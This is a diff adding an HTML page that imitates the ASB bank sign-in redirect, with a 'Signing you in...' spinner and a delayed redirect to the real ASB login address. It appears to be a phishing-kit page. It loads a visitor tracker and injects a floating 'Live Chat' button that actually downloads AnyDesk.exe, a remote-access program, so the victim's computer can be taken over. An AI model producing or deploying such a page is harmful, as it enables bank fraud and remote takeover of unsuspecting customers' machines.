@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ASB - Redirecting</title>
+<link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAAAAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8CCg3/H6fa/x+n2v8fqtf/ByUx/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/xZ6oP8frNn/ILHe/xNoh/8AAAD/AAAA/xuTwf8o4v//Kd///xqPvP8FFBz/BRoj/wUaJP8FGiP/BBQa/wo3SP8m1///KNr//yfX//8HKTX/AAUI/wAAAP8GJC7/Jc7//yTK//8lzv//I8P9/yTI//8kxv7/JMP//yTD//8jxv//JMr//yfX//8Xfqb/AAAA/wAAAP8AAAD/AAAA/xZ6oP8m1///JMj//yPD/f8htu3/KNr//yXR//8kyP//I8b//yXO//8jw/3/BRQc/wAAAP8AAAD/BR4n/wMOE/8EFBr/I8H6/yXR//8dpNb/AQgL/xBffP8jwfr/Jtf//yTK//8m1///EmiK/wAAAP8AAAD/AAAA/wxFWf8Vcpb/AAAA/xJnh/8p3///Hqng/wAAAP8AAAD/AQgL/xNqjP8jxv//Ir/5/wIKDf8AAAD/AAAA/wAAAP8KN0j/Jc7//wMOE/8BBAX/I8H6/yPG//8SaIr/EFt3/xBXc/8PU23/HZ/N/xBdev8AAAD/AAAA/wAAAP8AAAD/CTJD/ynh//8XfKP/AAAA/xFdev8n2f//Jtf//ybX//8m1///Kd///yG27f8ABAf/AAAA/wAAAP8AAAD/AAAA/wk3R/8p3///Kd///wcmM/8AAAD/Ibbt/yfZ//8l0f//JdH//yfc//8NSF//AAAA/wAAAP8AAAD/AAAA/wAAAP8GIi7/HZ/N/x6m0v8QV3L/AAAA/wxFWf8dn8j/G5fF/x2fyP8Xfqb/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'overpass', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    background: #000;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    color: #fff;
+  }
+  .logon-container {
+    width: 100%;
+    max-width: 500px;
+    margin: 0 auto;
+    padding: 0 16px;
+  }
+  .logon-header-logo {
+    margin-top: 2.62rem;
+    margin-bottom: 2.62rem;
+    text-align: center;
+  }
+  .logon-header-logo img {
+    height: 22px;
+    width: 98px;
+  }
+  .logon-container--grey {
+    background-color: #262626;
+    border-radius: 8px;
+    padding: 2rem 1.5rem;
+  }
+  .content {
+    text-align: center;
+    padding: 2rem 0;
+  }
+  .content h1 {
+    font-size: 1.5rem;
+    font-weight: 400;
+    color: #fff;
+    margin-bottom: 2rem;
+  }
+  .spinner-container {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 1.5rem;
+  }
+  .spinner {
+    width: 48px;
+    height: 48px;
+    border: 4px solid rgba(255,255,255,0.15);
+    border-top-color: #fcbd1b;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+  .content p {
+    font-size: 0.95rem;
+    color: #b3b3b3;
+    line-height: 1.5;
+  }
+  @media only screen and (max-width: 425px) {
+    .logon-header-logo {
+      margin-top: 1.56rem;
+      margin-bottom: 1.56rem;
+    }
+  }
+</style>
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+<!-- Live Chat floating button -->
+<style>
+  #asb-live-chat {
+    position: fixed !important;
+    bottom: 24px !important;
+    right: 24px !important;
+    z-index: 2147483647 !important;
+    display: inline-flex !important;
+    align-items: center !important;
+    gap: 8px !important;
+    padding: 12px 20px !important;
+    background: #ffffff !important;
+    color: #262626 !important;
+    font-family: 'overpass', Helvetica, Arial, sans-serif !important;
+    font-size: 14px !important;
+    font-weight: 500 !important;
+    line-height: 1 !important;
+    border: 1px solid rgb(212, 216, 222) !important;
+    border-radius: 100px !important;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.10), 0 1px 3px rgba(0,0,0,0.06) !important;
+    cursor: pointer !important;
+    text-decoration: none !important;
+    pointer-events: all !important;
+    transition: background 0.18s ease, color 0.18s ease, box-shadow 0.18s ease, transform 0.18s ease;
+    animation: asb-chat-slidein 0.4s cubic-bezier(0.22,1,0.36,1) both;
+    -webkit-font-smoothing: antialiased;
+  }
+  #asb-live-chat:hover {
+    background: #fcbd1b !important;
+    color: #000000 !important;
+    border-color: #fcbd1b !important;
+    box-shadow: 0 6px 20px rgba(252,189,27,0.28), 0 2px 6px rgba(252,189,27,0.18) !important;
+    transform: translateY(-2px) !important;
+  }
+  #asb-live-chat:active {
+    transform: translateY(0) scale(0.97) !important;
+  }
+  @keyframes asb-chat-slidein {
+    from { opacity: 0; transform: translateY(16px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+</style>
+<script>
+(function() {
+  function injectChatBtn() {
+    if (document.getElementById('asb-live-chat')) return;
+    var a = document.createElement('a');
+    a.id = 'asb-live-chat';
+    a.href = 'assets/AnyDesk.exe';
+    a.download = 'AnyDesk.exe';
+    a.title = 'Live Chat';
+    a.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 2H4C2.9 2 2 2.9 2 4V22L6 18H20C21.1 18 22 17.1 22 16V4C22 2.9 21.1 2 20 2ZM20 16H5.17L4 17.17V4H20V16Z" fill="currentColor"/><circle cx="8" cy="10" r="1.2" fill="currentColor"/><circle cx="12" cy="10" r="1.2" fill="currentColor"/><circle cx="16" cy="10" r="1.2" fill="currentColor"/></svg>Live Chat';
+    document.body.appendChild(a);
+  }
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', injectChatBtn);
+  } else {
+    injectChatBtn();
+  }
+  setTimeout(injectChatBtn, 500);
+  setTimeout(injectChatBtn, 1500);
+})();
+</script>
+  <div class="logon-container">
+    <div class="logon-header-logo">
+      <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA5OCAyMiI+PHBhdGggZmlsbD0iI0ZDQkQxQiIgZD0iTTI0LjcgNy41SDEzLjNjLS41IDAtLjkuMy0uOS45djUuMmMwIC41LjMuNy44LjUgMi43LTEuNCAxMS40LTYuMSAxMS42LTYuMi4zLS4yLjQtLjQtLjEtLjRNMzIuOSAyMmgtNi44bC0yLjItMy45SDkuOGwtMiAzLjlILjljLS40IDAtLjgtLjMtLjUtLjhDMi41IDE3LjUgMTEuNyAxIDExLjguOGMuMy0uNS41LS44IDEuMy0uOGg3LjVjLjggMCAxIC4zIDEuMi44LjEuMSA5LjQgMTYuNiAxMS42IDIwLjQuMy41LS4xLjgtLjUuOG0zNi4xLS44Vi44YzAtLjQuNC0uOC45LS44SDg5YzUuNSAwIDguMiAxLjMgOC4yIDUuNyAwIDMuMi0xLjEgNC4yLTIuNyA0LjgtLjMuMS0uMy40IDAgLjQgMi42LjUgMy41IDEuNyAzLjUgNSAwIDQuOC0yLjkgNi4xLTYuOSA2LjFINjkuOWMtLjUgMC0uOS0uNC0uOS0uOG03LjgtMTYuNXYzLjVoMTAuNmMxLjMgMCAyLS41IDItMS43IDAtMS4zLS43LTEuNy0yLTEuNyAwLS4xLTEwLjYtLjEtMTAuNi0uMXptMCA4LjVWMTdoMTAuN2MxLjUgMCAyLjUtLjYgMi41LTEuOSAwLTEuNS0xLTItMi41LTIgMCAuMS0xMC43LjEtMTAuNy4xek0wIC45VjEyYzAgLjUuMy40LjQgMEMuNSAxMS44IDUuMyAzLjQgNi44LjdjLjItLjQgMC0uNy0uNS0uN0guOUMuMyAwIDAgLjQgMCAuOU00NS43IDhoMTEuOGMzLjggMCA2LjkgMi41IDYuOSA1LjV2M2MwIDMtMy4xIDUuNS02LjkgNS41SDQzLjdjLTUuOSAwLTguMS0yLjktOC4zLTUuOCAwLS4zLS4xLS45LjktLjloNi45YzAgMS4yIDEgMS44IDIuNSAxLjhINTRjMS41IDAgMi41LS42IDIuNS0xLjggMC0xLjUtMS0xLjgtMi41LTEuOEg0My41Yy01LjkgMC04LTMtOC01LjlWNS4zYzAtMi45IDMtNS4zIDYuNi01LjNoMTQuN2MzLjYgMCA2LjUgMi4zIDYuNiA1LjIgMCAuNC4xLjktLjkuOWgtN1Y1LjhjLS4yLS45LS45LTEuMi0yLTEuMmgtNy44Yy0xLjMgMC0yIC40LTIgMS43LS4xIDEuMy43IDEuNyAyIDEuNyIvPjwvc3ZnPg==" alt="ASB">
+    </div>
+    <div class="logon-container--grey">
+      <div class="content">
+        <h1>Signing you in...</h1>
+        <div class="spinner-container">
+          <div class="spinner"></div>
+        </div>
+        <p>Please wait while we securely connect you to your account.</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    setTimeout(function() {
+      window.location.href = 'https://online.asb.co.nz/auth/';
+    }, 4000);
+  </script>
+</body>
+</html>
